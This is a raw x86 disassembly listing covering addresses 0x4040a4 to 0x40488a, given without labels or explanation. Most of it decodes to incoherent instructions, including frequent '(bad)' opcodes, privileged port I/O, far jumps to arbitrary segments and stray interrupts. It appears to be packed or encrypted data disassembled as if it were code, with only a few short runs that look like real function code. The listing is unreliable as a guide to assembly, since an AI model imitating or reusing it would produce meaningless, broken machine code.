  4040a4:	inc    eax
  4040a5:	pop    ebp
  4040a6:	fstp   DWORD PTR [edi-0x25]
  4040a9:	inc    eax
  4040aa:	ret    
  4040ab:	scas   eax,DWORD PTR es:[edi]
  4040ac:	in     al,0x2c
  4040ae:	pop    ecx
  4040af:	test   eax,0xf6c4fb3b
  4040b4:	add    BYTE PTR [ebx-0xe79cd81],bh
  4040ba:	mov    ds:0x7fb6fbf6,al
  4040bf:	xchg   ebx,eax
  4040c0:	add    BYTE PTR [edi+ecx*4+0x29],0xd3
  4040c5:	fild   QWORD PTR [ebx*1+0x45c7881b]
  4040cc:	fs pop esp
  4040ce:	ret    
  4040cf:	mov    dh,0xe8
  4040d1:	in     al,0xbc
  4040d3:	lds    ecx,FWORD PTR [edi+0x6194e1a6]
  4040d9:	in     eax,0xd0
  4040db:	daa    
  4040dc:	lods   eax,DWORD PTR ds:[esi]
  4040dd:	out    0xdb,al
  4040df:	or     eax,0xfcc4c583
  4040e4:	jne    0x4040d1
  4040e6:	loope  0x404095
  4040e8:	ins    BYTE PTR es:[edi],dx
  4040e9:	fwait
  4040ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040eb:	xchg   edi,eax
  4040ec:	mov    eax,ds:0xa1557616
  4040f1:	mov    ds:0x5436e18a,eax
  4040f6:	add    BYTE PTR ds:0xeadc84b,0x16
  4040fd:	(bad)  
  4040fe:	daa    
  4040ff:	shl    bh,0x79
  404102:	adc    eax,0xc95665e9
  404107:	mov    ch,BYTE PTR [esi*4-0x3103969a]
  40410e:	cmp    ebp,edi
  404110:	add    al,0x84
  404112:	or     bl,BYTE PTR [edi-0x18]
  404115:	test   eax,0xddd0fa96
  40411a:	sub    al,0xbe
  40411c:	and    BYTE PTR [eax],0xe2
  40411f:	cs add al,0x4c
  404122:	mov    dl,BYTE PTR [ecx+0x45e61f08]
  404128:	dec    ebx
  404129:	pop    eax
  40412a:	push   cs
  40412b:	retf   0x96f0
  40412e:	scas   eax,DWORD PTR es:[edi]
  40412f:	sub    BYTE PTR ds:0xfc61623f,ah
  404135:	in     eax,dx
  404136:	(bad)  
  404137:	push   edx
  404138:	pop    eax
  404139:	sub    BYTE PTR [edx-0x53],cl
  40413c:	cmp    BYTE PTR [esi-0x1ce2ffd6],dh
  404142:	mov    bl,0x2b
  404144:	(bad)  
  404145:	in     eax,0xad
  404147:	loopne 0x404152
  404149:	mov    edi,edx
  40414b:	jnp    0x4041ae
  40414d:	sub    al,0x82
  40414f:	xor    ch,ch
  404151:	cmp    bl,cl
  404153:	cmp    eax,0x337831bc
  404158:	jb     0x4041ce
  40415a:	mov    bh,0xfb
  40415c:	inc    ebx
  40415d:	rcl    BYTE PTR [ecx-0x5f6d87d9],1
  404163:	stos   BYTE PTR es:[edi],al
  404164:	dec    esp
  404165:	xchg   ebx,eax
  404166:	inc    esi
  404167:	inc    ebp
  404168:	mov    al,0xd0
  40416a:	xor    edi,DWORD PTR [ecx+eax*4-0x5d]
  40416e:	xchg   ecx,esp
  404170:	and    bh,BYTE PTR [ebx]
  404172:	xchg   esp,eax
  404173:	jb     0x40417b
  404175:	in     eax,dx
  404176:	clc    
  404177:	ss pop ebx
  404179:	int    0x74
  40417b:	jmp    0xf7bf:0x664fa8c2
  404182:	xchg   ebp,eax
  404183:	(bad)  
  404184:	pusha  
  404185:	lods   eax,DWORD PTR ds:[esi]
  404186:	retf   0xca47
  404189:	js     0x4041cf
  40418b:	jne    0x40411a
  40418d:	jb     0x40414a
  40418f:	into   
  404190:	jmp    0x65cdbb01
  404195:	mov    eax,0x14229723
  40419a:	stos   DWORD PTR es:[edi],eax
  40419b:	(bad)  
  40419c:	std    
  40419d:	das    
  40419e:	int    0xa5
  4041a0:	das    
  4041a1:	(bad)  
  4041a2:	mov    ds:0x5c38f4f0,al
  4041a7:	inc    ebx
  4041a8:	push   ebp
  4041a9:	adc    bl,BYTE PTR [ecx-0x2d]
  4041ac:	jns    0x40418f
  4041ae:	and    eax,0xb8b8db81
  4041b3:	sbb    eax,0x64f50c9c
  4041b8:	shl    DWORD PTR [edx+0x52],1
  4041bb:	push   esp
  4041bc:	(bad)  
  4041bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041be:	sbb    edi,DWORD PTR [ebx+0x4f]
  4041c1:	addr16 and eax,0xbd291d16
  4041c7:	jle    0x7a567b71
  4041cd:	mov    edx,0x584f283b
  4041d2:	and    bl,dh
  4041d4:	pop    edx
  4041d5:	and    al,0x6c
  4041d7:	and    BYTE PTR [ecx-0x54],bl
  4041da:	(bad)  
  4041db:	icebp  
  4041dc:	push   cs
  4041dd:	out    dx,eax
  4041de:	jp     0x404230
  4041e0:	mov    ch,0x9e
  4041e2:	push   esi
  4041e3:	sub    BYTE PTR [esi],0x34
  4041e6:	pop    ecx
  4041e7:	jo     0x4041b7
  4041e9:	xchg   BYTE PTR [ecx+ebp*1-0x3b9c92bd],ch
  4041f0:	fisubr DWORD PTR [ebx]
  4041f2:	xchg   ecx,eax
  4041f3:	mov    esp,DWORD PTR [edx]
  4041f5:	inc    ebx
  4041f6:	mov    ah,0x9d
  4041f8:	clc    
  4041f9:	adc    BYTE PTR [eax+0x1c],cl
  4041fc:	or     al,0xd6
  4041fe:	daa    
  4041ff:	mov    eax,ds:0x5a5bfda7
  404204:	jae    0x404226
  404206:	scas   al,BYTE PTR es:[edi]
  404207:	dec    esi
  404208:	xchg   ecx,eax
  404209:	jb     0x4041ab
  40420b:	xchg   ecx,eax
  40420c:	not    DWORD PTR [esi]
  40420e:	inc    esi
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x5],0x71
  404248:	dec    edi
  404249:	jb     0x404220
  40424b:	and    eax,0x7d6f7e7e
  404250:	jle    0x4042d0
  404252:	mov    ah,0xdf
  404254:	jle    0x4042b3
  404256:	jb     0x40426b
  404258:	adc    BYTE PTR ds:0x9c5eb576,bl
  40425e:	cli    
  40425f:	call   0x1365a49c
  404264:	out    dx,eax
  404265:	fs es xchg esp,eax
  404268:	and    BYTE PTR [ebp+0x20],dh
  40426b:	push   esp
  40426c:	add    DWORD PTR [ebp-0x168327fc],esp
  404272:	lds    eax,FWORD PTR [ebx+eax*1+0x57a7095c]
  404279:	mov    edi,0xb7ad8341
  40427e:	jp     0x404232
  404280:	dec    edx
  404281:	lods   al,BYTE PTR ds:[esi]
  404282:	mov    eax,0x46f4a8e9
  404287:	fs in  eax,0xf
  40428a:	mov    edx,0x642b3908
  40428f:	fnstsw WORD PTR [edi-0x3bd5f503]
  404295:	jo     0x404309
  404297:	xchg   esi,eax
  404298:	dec    edx
  404299:	and    al,0xea
  40429b:	dec    esi
  40429c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40429d:	inc    esi
  40429e:	mov    al,0xab
  4042a0:	and    dl,BYTE PTR [esi]
  4042a2:	inc    esp
  4042a3:	arpl   WORD PTR [ebp+0x17711c05],di
  4042a9:	imul   esi,DWORD PTR [esp+ebx*1-0x2023dbc4],0xc52fd420
  4042b4:	or     al,0xa0
  4042b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b7:	dec    BYTE PTR [ebx-0x1d]
  4042ba:	(bad)  
  4042bb:	(bad)  
  4042bc:	xlat   BYTE PTR ds:[ebx]
  4042bd:	jle    0x4042db
  4042bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c0:	mov    eax,0x4b7ecf14
  4042c5:	adc    al,0x36
  4042c7:	jnp    0x4042ed
  4042c9:	scas   eax,DWORD PTR es:[edi]
  4042ca:	outs   dx,DWORD PTR ds:[esi]
  4042cb:	sub    ebp,DWORD PTR [bp+si+0x7]
  4042cf:	test   DWORD PTR [ebx+0x3fff1771],esp
  4042d5:	xchg   ecx,eax
  4042d6:	adc    al,al
  4042d8:	loopne 0x404270
  4042da:	cli    
  4042db:	mov    bh,0x94
  4042dd:	dec    esi
  4042de:	mov    al,0x7e
  4042e0:	outs   dx,BYTE PTR ds:[esi]
  4042e1:	jne    0x404308
  4042e3:	mov    bh,BYTE PTR [eax+0x1c]
  4042e6:	mov    al,0x21
  4042e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e9:	dec    ebp
  4042ea:	cli    
  4042eb:	mov    ds:0x4c68dc3e,eax
  4042f0:	push   0xffffffb5
  4042f2:	pop    ecx
  4042f3:	adc    eax,0x26526028
  4042f8:	mov    DWORD PTR [esi+0x51b5a594],0xa652554a
  404302:	mov    bl,0x2b
  404304:	sub    al,0x8d
  404306:	mov    edx,0x6e9540ac
  40430b:	jmp    0x9ca2:0xc4f92b11
  404312:	adc    ebp,edi
  404314:	mov    al,ds:0x6f26db5f
  404319:	icebp  
  40431a:	jnp    0x404386
  40431c:	bound  esi,QWORD PTR [ecx]
  40431e:	scas   al,BYTE PTR es:[edi]
  40431f:	loopne 0x404304
  404321:	ret    0x9f54
  404324:	fsubr  st,st(2)
  404326:	pop    ds
  404327:	and    eax,edx
  404329:	push   esi
  40432a:	mov    ebp,0x1ba9ea8e
  40432f:	push   esi
  404331:	mov    ecx,0x82a173ea
  404336:	inc    edi
  404337:	stos   BYTE PTR es:[edi],al
  404338:	jbe    0x4042c6
  40433a:	inc    ecx
  40433b:	cmp    eax,0xb982e3c3
  404340:	daa    
  404341:	and    DWORD PTR [ebp+0x30a043b1],ecx
  404347:	icebp  
  404348:	lock dec esi
  40434a:	or     DWORD PTR [eax+esi*2+0x32712777],edx
  404351:	pop    esp
  404352:	xchg   BYTE PTR [edx+0x50faef0e],ah
  404358:	add    BYTE PTR [esi-0x43],0xd2
  40435c:	jl     0x404378
  40435e:	sbb    al,BYTE PTR [ebx-0x79]
  404361:	dec    ecx
  404362:	push   eax
  404363:	test   BYTE PTR [esi],cl
  404365:	ficomp WORD PTR [edi+ebx*2-0x7cb80b86]
  40436c:	imul   eax,DWORD PTR [edx],0x13329afc
  404372:	test   DWORD PTR [edi-0x47],0x250e5a42
  404379:	or     al,0x8d
  40437b:	lea    esp,[esi+0x5431a496]
  404381:	mov    esi,0xd50365ac
  404386:	xor    dh,dl
  404388:	jno    0x4043b1
  40438a:	dec    esi
  40438b:	enter  0x5172,0xf0
  40438f:	data16 jb 0x4043b8
  404392:	xor    DWORD PTR [edi],0x8c0e9421
  404398:	dec    edi
  404399:	sbb    eax,0x5748732b
  40439e:	dec    esi
  40439f:	jne    0x404382
  4043a1:	push   esi
  4043a2:	jae    0x4043e4
  4043a4:	add    bh,BYTE PTR cs:[esi+0x3bae276f]
  4043ab:	stc    
  4043ac:	test   al,0xd1
  4043ae:	(bad)  
  4043af:	addr16 test bh,ch
  4043b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b3:	mov    dl,0x4d
  4043b5:	add    bh,BYTE PTR [ebx]
  4043b7:	cmp    dl,BYTE PTR [edx-0x68]
  4043ba:	push   0x39d46f13
  4043bf:	mov    ch,0x1
  4043c1:	nop
  4043c2:	pop    esp
  4043c3:	pop    esp
  4043c4:	dec    ecx
  4043c5:	scas   eax,DWORD PTR es:[edi]
  4043c6:	xacquire xchg DWORD PTR [esi],esp
  4043c9:	sub    DWORD PTR [edx-0xf],0x3d39c7de
  4043d0:	data16 out dx,al
  4043d2:	jg     0x4043c5
  4043d4:	mov    esi,0x2804d810
  4043d9:	stos   DWORD PTR es:[edi],eax
  4043da:	or     cl,BYTE PTR [esi-0x7]
  4043dd:	mov    bh,0x57
  4043df:	mov    ebp,0x66f42642
  4043e4:	outs   dx,DWORD PTR ds:[esi]
  4043e5:	push   ebp
  4043e6:	inc    eax
  4043e7:	mov    edx,0x3686b1fd
  4043ec:	es in  al,dx
  4043ee:	das    
  4043ef:	jbe    0x4043fd
  4043f1:	adc    al,0xf5
  4043f3:	push   ss
  4043f4:	jmp    0xabb7:0xe065b2ae
  4043fb:	loop   0x404463
  4043fd:	pop    ecx
  4043fe:	pop    ebx
  4043ff:	mov    eax,ds:0x5e9ae18f
  404404:	add    al,0xc5
  404406:	xlat   BYTE PTR ds:[ebx]
  404407:	gs cld 
  404409:	popf   
  40440a:	or     al,0x79
  40440c:	daa    
  40440d:	leave  
  40440e:	sub    edi,esp
  404410:	and    eax,0xeabf9eed
  404415:	jne    0x404461
  404417:	cmc    
  404418:	(bad)  [edx-0x3256db63]
  40441e:	ret    0x2119
  404421:	and    al,0xd5
  404423:	shr    DWORD PTR [eax+0x70],1
  404426:	inc    edi
  404427:	jmp    0x4043fc
  404429:	sbb    DWORD PTR [eax+edx*8+0x77d96324],edx
  404430:	aaa    
  404431:	daa    
  404432:	dec    esp
  404433:	jmp    0x404414
  404435:	inc    ebx
  404436:	(bad)  
  404438:	jecxz  0x404412
  40443a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443b:	push   edi
  40443c:	dec    edi
  40443d:	imul   edx,edi,0xfffffff8
  404440:	in     eax,0xef
  404442:	xchg   edx,eax
  404443:	mov    DWORD PTR [eax+0x3f8c6e73],edi
  404449:	fs xor eax,0x2e631e73
  40444f:	push   ebx
  404450:	mov    ch,0x69
  404452:	xchg   edi,eax
  404453:	jo     0x4044af
  404455:	cmc    
  404456:	mul    BYTE PTR [ebp-0x46c396d8]
  40445c:	sbb    DWORD PTR [esi+0x3bf30d70],ebp
  404462:	xchg   ebp,eax
  404463:	mov    ch,0xae
  404465:	adc    ecx,DWORD PTR [esp+edx*2+0x26]
  404469:	and    eax,0x7c21aabd
  40446e:	cld    
  40446f:	push   0x5133c09d
  404474:	shr    DWORD PTR [ecx+0x29],0x5f
  404478:	jno    0x4044e7
  40447a:	and    BYTE PTR [eax-0x26],ch
  40447d:	jne    0x4044c3
  40447f:	pop    ecx
  404480:	imul   DWORD PTR [ebx+0x67]
  404483:	lock inc edi
  404485:	pop    ecx
  404486:	sub    BYTE PTR gs:[ebx-0x6],bl
  40448a:	mov    dh,ah
  40448c:	ins    DWORD PTR es:[edi],dx
  40448d:	imul   esp,DWORD PTR [ecx-0x39be418b],0xffffffb9
  404494:	lahf   
  404495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404496:	adc    eax,0xcdf7bde8
  40449b:	pop    ebx
  40449c:	mov    dh,BYTE PTR [esi]
  40449e:	lods   eax,DWORD PTR ds:[esi]
  40449f:	pushf  
  4044a0:	int3   
  4044a1:	mul    DWORD PTR [eax+edx*1+0x3f]
  4044a5:	push   edx
  4044a6:	dec    edi
  4044a7:	mov    ch,0x30
  4044a9:	pop    edx
  4044aa:	dec    ebx
  4044ab:	adc    al,0x83
  4044ad:	mov    edi,0xba0cea2
  4044b2:	xchg   esi,eax
  4044b3:	inc    ebp
  4044b4:	syscall 
  4044b6:	adc    DWORD PTR [ebx+0x3e],eax
  4044b9:	ins    DWORD PTR es:[edi],dx
  4044ba:	mov    edx,DWORD PTR ds:0x70cb1233
  4044c0:	cmp    BYTE PTR [edi-0x29],bh
  4044c3:	xor    al,BYTE PTR [edi+0x3]
  4044c6:	jmp    0xc9673e50
  4044cb:	aad    0x32
  4044cd:	and    al,0xa1
  4044cf:	push   DWORD PTR [eax]
  4044d1:	pop    ss
  4044d2:	cmp    DWORD PTR [ecx+0x1d],ebx
  4044d5:	adc    BYTE PTR [ebx],0xde
  4044d8:	into   
  4044d9:	mov    ebp,0xacb450bf
  4044de:	add    BYTE PTR [ecx-0x2b],bh
  4044e1:	ret    
  4044e2:	mov    eax,ds:0x90256467
  4044e7:	aam    0x80
  4044e9:	mov    eax,0x159f5310
  4044ee:	das    
  4044ef:	inc    ebp
  4044f0:	shl    BYTE PTR [ecx+0x10152ab4],cl
  4044f6:	(bad)  
  4044f7:	popa   
  4044f8:	sahf   
  4044f9:	mov    bl,0xdb
  4044fb:	mov    gs,ebx
  4044fd:	lea    edi,[esi-0x77f02c0]
  404503:	cmc    
  404504:	sub    BYTE PTR [ebp+0x7589d37],bl
  40450a:	inc    esi
  40450b:	xchg   esp,eax
  40450c:	xor    DWORD PTR [esi-0x58a30f8e],0x6e93abde
  404516:	bound  ebp,QWORD PTR [edi+0x2b]
  404519:	sub    cl,bh
  40451b:	inc    eax
  40451c:	ja     0x404517
  40451e:	dec    eax
  40451f:	mov    WORD PTR [edx],ds
  404521:	shl    BYTE PTR [edx+0x58],1
  404524:	push   0x82bb5d4a
  404529:	dec    ebx
  40452a:	es xchg ebx,eax
  40452c:	in     eax,dx
  40452d:	dec    eax
  40452e:	mov    dh,0xc1
  404530:	shr    ebx,cl
  404532:	mov    ebx,0x84055e5a
  404537:	shr    DWORD PTR [ecx],1
  404539:	push   es
  40453a:	add    al,0x52
  40453c:	cs fcmove st,st(2)
  40453f:	xchg   ebp,eax
  404540:	xchg   edi,eax
  404541:	mov    al,0x5a
  404543:	add    DWORD PTR ds:0xaadd9879,ebx
  404549:	xor    BYTE PTR [ebx+eax*4+0x225ae7de],dl
  404550:	mov    ecx,0xc080b3da
  404555:	lahf   
  404556:	test   eax,0x862579d8
  40455b:	cmp    DWORD PTR [eax-0x4d514e63],ebx
  404561:	pop    ecx
  404562:	retf   0x62dc
  404565:	in     al,dx
  404566:	jmp    0x1639:0x9a52f26
  40456d:	scas   eax,DWORD PTR es:[edi]
  40456e:	pop    edi
  40456f:	push   esi
  404570:	or     al,0x1c
  404572:	jb     0x40456a
  404574:	push   edx
  404575:	cmp    ch,al
  404577:	jmp    0xa20a3e69
  40457c:	lds    esi,FWORD PTR [ebp+0x6e]
  40457f:	aaa    
  404580:	xchg   esp,eax
  404581:	scas   al,BYTE PTR es:[edi]
  404582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404583:	iret   
  404584:	fs push ebp
  404586:	(bad)  
  404587:	or     al,BYTE PTR [ecx]
  404589:	int    0xbb
  40458b:	ror    bh,cl
  40458d:	push   edi
  40458e:	or     BYTE PTR [ecx],dl
  404590:	xlat   BYTE PTR ds:[ebx]
  404591:	jl     0x4045ac
  404593:	in     eax,dx
  404594:	cmp    eax,0x8fbc71a1
  404599:	nop    DWORD PTR [ecx+0x2b5540f1]
  4045a0:	or     eax,0xf3ca44d5
  4045a5:	test   al,0xc8
  4045a7:	mov    esi,0x332e48f6
  4045ac:	jno    0x4045b2
  4045ae:	mov    eax,ds:0xb25a24fb
  4045b3:	jp     0x404628
  4045b5:	in     eax,0xbe
  4045b7:	pop    ebx
  4045b8:	(bad)  
  4045ba:	sbb    DWORD PTR [ecx+eiz*4+0x34],esp
  4045be:	sub    ecx,esp
  4045c0:	int3   
  4045c1:	mov    al,0x37
  4045c3:	mov    dh,0x9b
  4045c5:	xor    al,BYTE PTR [edx-0x2d]
  4045c8:	xchg   esp,eax
  4045c9:	jae    0x4045f5
  4045cb:	popa   
  4045cc:	inc    ebx
  4045cd:	dec    edi
  4045ce:	gs sbb edi,esp
  4045d1:	cdq    
  4045d2:	xchg   ecx,eax
  4045d3:	mov    gs,WORD PTR [esi]
  4045d5:	pop    esi
  4045d6:	lea    eax,[ebx]
  4045d8:	mov    fs,WORD PTR [ebx+ebx*8]
  4045db:	sbb    BYTE PTR [ebp+0x8b6e961],0x93
  4045e2:	leave  
  4045e3:	ficomp WORD PTR [edi]
  4045e5:	loope  0x404632
  4045e7:	mov    bh,0x5b
  4045e9:	jecxz  0x4045f1
  4045eb:	xlat   BYTE PTR ds:[ebx]
  4045ec:	ja     0x4045e9
  4045ee:	jmp    0x93e7a188
  4045f3:	adc    ah,BYTE PTR [ebx+0x3b]
  4045f6:	fidivr DWORD PTR [eax]
  4045f8:	retf   0x6b2d
  4045fb:	and    al,0xe8
  4045fd:	adc    BYTE PTR [edx-0x14],ah
  404600:	mov    eax,0xa063ad63
  404605:	in     al,dx
  404606:	pop    ss
  404607:	sbb    al,0x44
  404609:	or     eax,DWORD PTR [ecx+ecx*1]
  40460c:	mov    ds:0x13bfb437,al
  404611:	leave  
  404612:	bound  ecx,QWORD PTR [eax+0x2f0bcc40]
  404618:	(bad)  
  404619:	int    0x58
  40461b:	add    cl,BYTE PTR [edi+0x6d]
  40461e:	loopne 0x4045a5
  404620:	ret    0x9f8a
  404623:	xor    al,0xbf
  404625:	out    dx,eax
  404626:	cli    
  404627:	push   es
  404628:	xor    dh,bh
  40462a:	inc    esi
  40462b:	ficomp DWORD PTR [ebx-0x2516a402]
  404631:	(bad)  
  404632:	jle    0x4045c4
  404634:	scas   eax,DWORD PTR es:[edi]
  404635:	jbe    0x404622
  404637:	cmp    al,0x4
  404639:	or     al,0x87
  40463b:	gs out dx,eax
  40463d:	sbb    al,0x11
  40463f:	add    ch,dh
  404641:	sti    
  404642:	mov    eax,0x58d30ff
  404647:	ret    0x413d
  40464a:	add    bh,bh
  40464c:	xor    BYTE PTR [edi+0x534343d3],al
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0xf183b5e3
  404675:	mov    esp,0x7e7e21c2
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x40465e
  40467f:	jne    0x404661
  404681:	daa    
  404682:	ds fs popf 
  404685:	or     esi,DWORD PTR [edx]
  404687:	cmp    DWORD PTR [ebp+0x46],ecx
  40468a:	outs   dx,BYTE PTR ds:[esi]
  40468b:	sbb    DWORD PTR [edx+0x2f94ef0a],esp
  404691:	clc    
  404692:	call   0x6ab3:0xc7ede951
  404699:	cdq    
  40469a:	xchg   edi,eax
  40469b:	pop    edx
  40469c:	dec    edx
  40469d:	(bad)  
  40469e:	sub    eax,0x8be8c1a0
  4046a3:	cmp    ah,BYTE PTR [ebp+0x3a]
  4046a6:	arpl   bx,ax
  4046a8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4046aa:	stos   DWORD PTR es:[edi],eax
  4046ab:	xor    ebp,DWORD PTR [edx+0x5f]
  4046ae:	je     0x404651
  4046b0:	push   ebx
  4046b1:	in     eax,dx
  4046b2:	add    dh,BYTE PTR [ecx+0x69]
  4046b5:	xchg   DWORD PTR [edx-0x59],eax
  4046b8:	lods   al,BYTE PTR ds:[esi]
  4046b9:	fcom   st(2)
  4046bb:	(bad)  
  4046bd:	jmp    0x4046c4
  4046bf:	rol    BYTE PTR [edx],0xc
  4046c2:	pop    es
  4046c3:	das    
  4046c4:	mov    ds:0x48378cbc,al
  4046c9:	dec    ebx
  4046ca:	ins    DWORD PTR es:[edi],dx
  4046cb:	sbb    bh,0x24
  4046ce:	aaa    
  4046cf:	pop    es
  4046d0:	mov    dh,0x6d
  4046d2:	mov    al,ds:0x38c2cd99
  4046d7:	sub    eax,0x11
  4046da:	loop   0x4046b1
  4046dc:	fld    TBYTE PTR [ecx]
  4046de:	ja     0x4046d1
  4046e0:	fwait
  4046e1:	xor    BYTE PTR [ebp-0x7c5ada30],dl
  4046e7:	sbb    esi,DWORD PTR ds:0xf80b02ad
  4046ed:	dec    esi
  4046ee:	dec    edi
  4046ef:	mov    eax,ds:0xe697ecb1
  4046f4:	jo     0x404752
  4046f6:	arpl   WORD PTR [edi+edx*4-0x7f],di
  4046fa:	sete   BYTE PTR [ecx]
  4046fd:	imul   ecx,ebx,0x47c8dc89
  404703:	or     DWORD PTR [ebx+0x9ea9d9a],ebp
  404709:	cmp    bh,BYTE PTR [eax]
  40470b:	fs dec ebp
  40470d:	and    eax,0xc46c2684
  404712:	lea    ecx,[ebx+0x42]
  404715:	test   BYTE PTR [edx],ch
  404717:	or     dh,BYTE PTR [ebx+edi*2+0x63]
  40471b:	fld    st(1)
  40471d:	dec    ecx
  40471e:	adc    BYTE PTR [edx],al
  404720:	pop    esi
  404721:	ss push cs
  404723:	xor    BYTE PTR ds:0xd6e5253f,al
  404729:	push   ebp
  40472a:	sub    DWORD PTR [ebp-0x303a9583],eax
  404730:	mov    ebx,0x80989959
  404735:	pop    esp
  404736:	inc    esp
  404737:	clc    
  404738:	test   BYTE PTR [edx],bl
  40473a:	iret   
  40473b:	push   0xffffffbf
  40473d:	ins    BYTE PTR es:[edi],dx
  40473e:	xor    eax,0x27971df5
  404743:	nop
  404744:	enter  0x7b3e,0x9a
  404748:	or     al,0x39
  40474a:	jb     0x404741
  40474c:	bnd ds je 0x40476b
  404750:	dec    esi
  404751:	(bad)
  404754:	xor    eax,0xdb7b3288
  404759:	out    dx,eax
  40475a:	jne    0x404751
  40475c:	inc    esp
  40475d:	or     ecx,DWORD PTR [edi+0x10637d78]
  404763:	call   0x853c:0xfc8d143d
  40476a:	jg     0x404701
  40476c:	mov    ah,0xdf
  40476e:	xchg   ebp,eax
  40476f:	inc    DWORD PTR [esp+eax*4-0x73]
  404773:	(bad)  
  404774:	cmp    bl,BYTE PTR [ecx+0x5]
  404777:	pop    ebx
  404778:	out    0x96,al
  40477a:	(bad)  
  40477b:	shr    BYTE PTR [ebp+0x1e],cl
  40477e:	dec    ecx
  40477f:	inc    esi
  404780:	and    bh,bl
  404782:	xchg   edx,eax
  404783:	mov    esp,0xd99acc54
  404788:	mov    ah,0x23
  40478a:	mov    ds:0xf932043,al
  40478f:	xor    edx,DWORD PTR [eax]
  404791:	and    BYTE PTR [esi-0x74],0x8f
  404795:	and    ecx,edi
  404797:	jl     0x40475f
  404799:	or     eax,0x4953d799
  40479e:	ret    
  40479f:	pop    ss
  4047a0:	dec    ebx
  4047a1:	in     eax,0xe
  4047a3:	jle    0x4047e8
  4047a5:	and    edi,DWORD PTR [ebx-0x24fc463d]
  4047ab:	add    ebp,ebp
  4047ad:	jg     0x40481e
  4047af:	(bad)  
  4047b0:	adc    BYTE PTR [esi-0x1f],dh
  4047b3:	(bad)  
  4047b4:	jecxz  0x404759
  4047b6:	mov    eax,ds:0xdb4eadfe
  4047bb:	mov    al,0x72
  4047bd:	cmp    bh,BYTE PTR [edx+0x790abec2]
  4047c3:	pop    esp
  4047c4:	jle    0x4047ba
  4047c6:	and    eax,DWORD PTR [ebx]
  4047c8:	jb     0x40479c
  4047ca:	stos   BYTE PTR es:[edi],al
  4047cb:	test   al,0x91
  4047cd:	and    esi,ebx
  4047cf:	adc    al,0xb6
  4047d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d2:	mov    ebx,0xadd6967d
  4047d7:	push   ebp
  4047d8:	lahf   
  4047d9:	mov    edi,0x49938189
  4047de:	enter  0x81b3,0xeb
  4047e2:	add    ecx,DWORD PTR [esi+edi*1-0x4ef25c32]
  4047e9:	sub    BYTE PTR [edi+0x5b],cl
  4047ec:	mov    cl,0x3c
  4047ee:	push   eax
  4047ef:	outs   dx,DWORD PTR ds:[esi]
  4047f0:	sub    esp,0xffffffe3
  4047f3:	arpl   WORD PTR [edx+0x72],dx
  4047f6:	add    al,0x1f
  4047f8:	imul   ecx,DWORD PTR [eax+0x6],0xb676287a
  4047ff:	icebp  
  404800:	cmp    al,0xcc
  404802:	scas   eax,DWORD PTR es:[edi]
  404803:	xor    edx,DWORD PTR ds:0xbe99e370
  404809:	sbb    ch,al
  40480b:	mov    BYTE PTR [edi-0x7a],0x82
  40480f:	sbb    DWORD PTR [esi],esi
  404811:	hlt    
  404812:	loop   0x404843
  404814:	inc    esi
  404815:	cdq    
  404816:	iret   
  404817:	mov    al,0x5a
  404819:	push   0xe3021936
  40481e:	adc    edi,DWORD PTR [edx-0x15d2c9c2]
  404824:	push   esp
  404825:	push   ebp
  404826:	mov    esi,0xbc2fb57d
  40482b:	sbb    BYTE PTR [edi-0x31],al
  40482e:	mov    BYTE PTR [ecx+eax*4-0x24],bl
  404832:	pushf  
  404833:	imul   ecx,ecx,0xffffffa4
  404836:	es sti 
  404838:	fs (bad) 
  40483a:	shl    BYTE PTR [ecx],1
  40483c:	bound  ebp,QWORD PTR ds:0x31fcb35a
  404842:	mov    cl,0x8f
  404844:	iret   
  404845:	sbb    DWORD PTR [ebx-0x2bae6bfe],esi
  40484b:	arpl   WORD PTR [ecx],dx
  40484d:	lds    esi,FWORD PTR [eax-0x59]
  404850:	push   eax
  404851:	loop   0x404828
  404853:	jno    0x404839
  404855:	add    ebx,DWORD PTR [edi]
  404857:	xchg   esi,eax
  404858:	pop    ebp
  404859:	or     DWORD PTR [ecx],ebx
  40485b:	dec    esi
  40485c:	mov    al,ds:0xf9a18e8d
  404861:	fxch   st(6)
  404863:	add    DWORD PTR [edx-0x33c0e58c],esp
  404869:	mov    bh,0x8f
  40486b:	out    dx,al
  40486c:	xor    al,0xa6
  40486e:	jae    0x404819
  404870:	mov    ah,0xf0
  404872:	lahf   
  404873:	loope  0x404814
  404875:	jp     0x404861
  404877:	xchg   esp,eax
  404878:	stc    
  404879:	test   al,0x40
  40487b:	jno    0x404822
  40487d:	je     0x40480e
  40487f:	call   0x15d2:0x361b7f36
  404886:	pop    ds
  404887:	(bad)  
  404888:	ret    
  404889:	pop    edx
  40488a:	outs   dx,DWORD PTR ds:[esi]
